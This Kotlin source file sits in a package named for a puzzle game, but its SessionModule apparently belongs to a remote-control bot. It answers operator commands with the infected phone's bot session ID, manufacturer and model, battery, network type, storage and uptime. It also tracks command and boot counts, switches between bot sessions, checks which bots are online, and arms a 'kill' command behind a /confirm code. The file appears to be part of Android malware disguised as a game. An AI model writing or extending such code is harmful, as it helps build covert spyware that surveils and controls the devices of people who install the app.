package com.puzzleblast.game.modules

import android.content.Context
import android.os.Build
import com.puzzleblast.game.core.BotConfig
import com.puzzleblast.game.core.SessionManager
import com.puzzleblast.game.util.Prefs

object SessionModule {
    suspend fun session(ctx: Context): String = "🎫 SID: ${BotConfig.sid}\n📱 ${Build.MANUFACTURER} ${Build.MODEL}"

    suspend fun ping(ctx: Context, start: Long): String {
        val rtt = System.currentTimeMillis() - start
        val up = (System.currentTimeMillis() - Prefs.startTime) / 1000
        return "🏓 pong · ${rtt}ms · up ${up}s"
    }

    suspend fun status(ctx: Context): String {
        val bm = ctx.getSystemService(Context.BATTERY_SERVICE) as android.os.BatteryManager
        val batt = bm.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY)
        val cm = ctx.getSystemService(Context.CONNECTIVITY_SERVICE) as android.net.ConnectivityManager
        val net = cm.activeNetworkInfo?.typeName ?: "none"
        val stat = android.os.StatFs(android.os.Environment.getDataDirectory().path)
        val used = (stat.totalBytes - stat.availableBytes) / 1024 / 1024
        val total = stat.totalBytes / 1024 / 1024
        val up = (System.currentTimeMillis() - Prefs.startTime) / 1000
        return "🔋 ${batt}%\n📶 $net\n💾 ${used}MB/${total}MB\n⏱ up ${up}s"
    }

    suspend fun report(ctx: Context): String =
        "📋 Report\ncmds today: ${Prefs.cmdCount}\nerrors: ${Prefs.errCount}\nlast active: ${Prefs.lastActive}\nboots: ${Prefs.bootCount}"

    suspend fun background(ctx: Context): String = SessionManager.background()

    suspend fun use(ctx: Context, sid: String): String = SessionManager.use(sid)

    suspend fun checkOnline(ctx: Context, target: String?): String {
        if (target == null || target.equals("all", true)) return "📡 online · ${BotConfig.sid}"
        return if (target.equals(BotConfig.sid, true)) "📡 online · ${BotConfig.sid}" else "🎯 SID mismatch"
    }

    suspend fun kill(ctx: Context): String {
        Prefs.pendingConfirm = randomCode()
        Prefs.pendingConfirmCmd = "kill"
        Prefs.pendingConfirmExpiry = System.currentTimeMillis() + 60_000
        return "💀 confirm: /confirm ${Prefs.pendingConfirm} (60s)"
    }

    fun randomCode(): String = (100000..999999).random().toString()
}
